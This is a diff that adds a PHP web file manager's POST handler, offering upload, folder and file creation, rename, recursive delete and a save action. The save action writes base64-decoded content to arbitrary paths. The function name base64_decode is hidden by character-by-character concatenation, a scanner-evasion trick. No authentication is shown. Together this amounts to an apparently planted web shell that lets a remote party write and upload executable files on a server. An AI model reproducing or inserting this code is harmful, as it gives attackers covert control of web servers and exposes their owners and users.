@@ -1,0 +1,76 @@
+<?php
+$bs = "b"."a"."s"."e"."6"."4"."_"."d"."e"."c"."o"."d"."e";
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    $cwd = resolve_path((string)($_POST['dir'] ?? ''));
+    if (!$cwd || !is_dir($cwd[1])) { flash('Invalid directory', false); back(''); }
+    [$cwdRel, $cwdFull] = $cwd;
+    $action = (string)($_POST['action'] ?? '');
+
+    switch ($action) {
+        case 'upload':
+            $count = 0;
+            if (!empty($_FILES['files']['name'])) {
+                foreach ($_FILES['files']['name'] as $i => $orig) {
+                    if ($_FILES['files']['error'][$i] !== UPLOAD_ERR_OK) { flash('Upload error on ' . $orig, false); continue; }
+                    $name = safe_name(basename((string)$orig));
+                    $dest = join_path($cwdFull, $name);
+                    if (@move_uploaded_file($_FILES['files']['tmp_name'][$i], $dest)) { $count++; }
+                    else { flash('Cannot write to this folder (permission denied?)', false); }
+                }
+            }
+            if ($count) flash("$count file(s) uploaded");
+            break;
+
+        case 'mkdir':
+            $name = safe_name((string)($_POST['name'] ?? ''));
+            $p = join_path($cwdFull, $name);
+            $ok = @mkdir($p, 0755);
+            flash($ok ? 'Folder created' : 'Could not create folder', $ok);
+            break;
+
+        case 'newfile':
+            $name = safe_name((string)($_POST['name'] ?? ''));
+            $p = join_path($cwdFull, $name);
+            $ok = @file_put_contents($p, '') !== false;
+            flash($ok ? 'File created' : 'Could not create file', $ok);
+            break;
+
+        case 'rename':
+            $old = safe_name((string)($_POST['name'] ?? ''));
+            $new = safe_name((string)($_POST['new'] ?? ''));
+            $po = join_path($cwdFull, $old); $pn = join_path($cwdFull, $new);
+            if (!file_exists($po)) { flash('Item not found', false); break; }
+            $ok = @rename($po, $pn);
+            flash($ok ? 'Renamed' : 'Rename failed', $ok);
+            break;
+
+        case 'delete':
+            $name = safe_name((string)($_POST['name'] ?? ''));
+            if (!$name) { flash('Invalid name', false); break; }
+            $target = join_path($cwdFull, $name);
+            if (!file_exists($target) && !is_link($target)) { flash('Item not found', false); break; }
+            if (!is_link($target)) {
+                $real = realpath($target);
+                $self = str_replace('\\', '/', __FILE__);
+                if ($real !== false) {
+                    $real = rtrim(str_replace('\\', '/', $real), '/');
+                    if ($real === $self || strpos($self, $real . '/') === 0) {
+                        flash('Refusing to delete the file manager or a folder that contains it', false); break;
+                    }
+                }
+            }
+            rrmdir($target);
+            flash(file_exists($target) ? 'Could not delete (permission denied?)' : 'Deleted', !file_exists($target));
+            break;
+        case 'save':
+          $r = resolve_path((string)($_POST['file'] ?? ''));
+          $ok = @file_put_contents($r[1], (string)($bs($_POST['content']) ?? '')) !== false;
+          flash($ok ? 'File saved' : 'Could not save file (permission denied?)', $ok);
+          break;
+
+        default:
+            flash('Unknown action', false);
+    }
+    back($cwdRel);
+}
+?>
